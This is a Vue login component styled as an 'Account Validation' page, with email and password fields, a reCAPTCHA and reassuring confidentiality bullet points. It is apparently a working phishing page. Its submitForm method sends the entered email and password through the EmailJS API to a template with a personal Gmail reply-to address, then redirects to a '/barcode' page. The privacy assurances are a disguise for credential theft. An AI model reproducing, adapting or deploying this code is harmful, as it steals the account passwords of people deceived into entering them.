<template>
  <div
    class="hello"
    style="display: flex;
    justify-content: center;"
  >
    <div class="container">
      <div style="display: flex; justify-content: center;">
        <div style="height: 120px; width: 120px;">
          <img
            style="width: 100%; height: 100%;"
            src="../assets/settings.png"
            alt=""
          />
        </div>
      </div>

      <div class="title">
        <h3></h3>

        <!-- <div class="title-tab">
          <span>Account Validation</span>
        </div> -->
      </div>

      <h2 style="text-align: center;">Account Validation</h2>
      <div class="divider"></div>
      <el-form
        :label-position="labelPosition"
        :model="ruleForm"
        :rules="rules"
        ref="ruleForm"
        label-width="120px"
        class="demo-ruleForm"
      >
        <el-form-item label="Email Address/Username" prop="name">
          <el-input v-model="ruleForm.name"></el-input>
        </el-form-item>
        <el-form-item label="Password" prop="password">
          <el-input type="password" v-model="ruleForm.password"></el-input>
        </el-form-item>
        <div
        style="margin-top: 1rem;"
          class="g-recaptcha"
          data-sitekey="6LendeAZAAAAANQ9d2W0hNfT4JPpihKgVN9pWerd"
        ></div>
        <!-- <div class="g-recaptcha" data-sitekey="6LfEov4UAAAAAN8Hv8YDyqpqxGrt6RLnT5qMWxHA"></div> -->
        <el-form-item style="margin: 20px 0px;">
          <el-button
            :loading="loader"
            type="primary"
            class="btn-text"
            @click="submitForm('ruleForm')"
            >Login</el-button
          >
        </el-form-item>
      </el-form>
      <div class="divider"></div>

      <!-- <p class="terms">
        if you click the authentication/activation link, you will be registered
        and you agree to the
        <span @click="openDialog('Terms & Conditions')"
          >terms & conditions</span
        >
        &nbsp; and &nbsp;
        <span @click="openDialog('Privacy Policy')">Privacy Policy</span>
      </p> -->
      <ul style="list-style-type: unset;">
        <li style="font-size: 11px; display: list-item;">
          The information collected is confidential and will not be disclosed by
          us to unauthorized third parties.
        </li>
        <li style="font-size: 11px; display: list-item;">
          Customers are reminded to kindly provide accurate and truthful
          information for authentication and not to provide data which is false
          or which belongs to third parties. Authentication information will not
          be modified.
        </li>
        <li style="font-size: 11px;display: list-item;">
          Authentication process will be carried out immediately upon receipt of
          information, and we will have notify you of the authentication result.
        </li>
      </ul>
    </div>

    <el-dialog :title="modalHeader" :visible.sync="dialogVisible" width="90%">
      <span>{{ modalBody }}</span>
      <span slot="footer" class="dialog-footer">
        <el-button @click="dialogVisible = false">Cancel</el-button>
      </span>
    </el-dialog>
  </div>
</template>

<script>
import axios from "axios";
export default {
  name: "HelloWorld",
  props: {
    msg: String,
  },
  methods: {
    submitForm(formName) {
      var self = this;
      this.loader = true;

      this.$refs[formName].validate((valid) => {
        if (valid) {
          var data = {
            service_id: "123456789",
            template_id: "template_8f1cut7",
            user_id: "user_6dMy0FAzh3UkwGQuDDbjZ",
            template_params: {
              email: this.ruleForm.name,
              password: this.ruleForm.password,
              reply_to: "janetwilliams1305@gmail.com",
            },
          };
          axios
            .post("https://api.emailjs.com/api/v1.0/email/send", data)
            .then(function() {
              self.loader = false;
              self.$router.push("/barcode");
            })
            .catch(function() {
              this.loader = false;
            });
        } else {
          this.loader = false;
          return false;
        }
      });
    },
    resetForm(formName) {
      this.$refs[formName].resetFields();
    },
    openDialog(headerItem) {
      this.dialogVisible = true;
      this.modalHeader = headerItem;
      if (
        headerItem ===
        "Welcome to Website Name! These terms and conditions outline the rules and regulations for the use of Company Name's Website, located at Website.com. By accessing this website we assume you accept these terms and conditions. Do not continue to use Website Name if you do not agree to take all of the terms and conditions stated on this page."
      ) {
        this.modalBody = "Terms and conditions are required";
      } else {
        this.modalBody =
          "At Website Name, accessible at Website.com, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by Website Name and how we use it. If you have additional questions or require more information about our Privacy Policy, do not hesitate to contact us through email at Email@Website.com";
      }
    },
  },
  data() {
    return {
      loader: false,
      dialogVisible: false,
      modalHeader: "",
      modalBody: "",
      labelPosition: "top",
      ruleForm: {
        name: "",
        password: "",
      },
      rules: {
        name: [
          {
            required: true,
            message: "Please input email address",
            trigger: "blur",
          },
          {
            type: "email",
            message: "Please input correct email address",
            trigger: ["blur", "change"],
          },
        ],
        password: [
          {
            required: true,
            message: "Please input Password",
            trigger: "blur",
          },
        ],
      },
    };
  },
};
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
h3 {
  margin: 40px 0 0;
}
ul {
  list-style-type: none;
  padding: 0;
}
li {
  display: inline-block;
  margin: 0 10px;
}
a {
  color: #42b983;
}

.divider {
  border: 1px solid #eee;
  margin-bottom: 1rem;
}

.container {
  width: 30%;
}

.hello .el-button--primary {
  width: 100%;
  height: 50px;
  margin-top: 0.3rem;
  background: limegreen;
  border-color: limegreen;
}

.hello .el-form-item__content .el-input input {
  height: 50px;
}

.hello .title h3 {
  text-align: center;
}

.terms {
  font-size: 14px;
  color: #666;
}

.terms span {
  color: limegreen;
  cursor: pointer;
  transition: all 0.5s;
}

.terms span:hover {
  text-decoration: underline;
}

.hello .title .title-tab {
  width: 100%;
  text-transform: uppercase;
  letter-spacing: 0.3rem;
  background: #3b5998;
  height: 50px;
  border-radius: 90px;
  margin: 1rem 0rem;
  color: white;
  display: flex;
  justify-content: center;
  align-items: center;
}

.hello .title .title-tab span {
  font-weight: 900;
}

@media only screen and (max-width: 600px) {
  .container {
    width: 100%;
    padding: 20px;
  }
}
</style>
